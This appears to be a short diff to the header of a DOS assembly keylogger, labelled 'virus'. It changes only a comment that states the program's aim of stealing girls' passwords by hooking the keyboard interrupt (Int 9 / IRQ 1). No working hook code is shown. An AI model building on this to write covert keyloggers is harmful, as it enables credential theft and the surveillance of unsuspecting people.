@@ -1,5 +1,5 @@
 ; mundial keylogger
-; Copyright (c) 2015-2018, Bruno Guimarães Salvador. To HIJACK girls passwords by hooking the Int 9 == IRQ 1 of their PCs
+; Copyright (c) 2015-2018, Bruno Guimarães Salvador. To H*J*CK girls passwords by hooking the Int 9 == IRQ 1 of their PCs
 ; All rights reserved.
 org 100h
 virus:
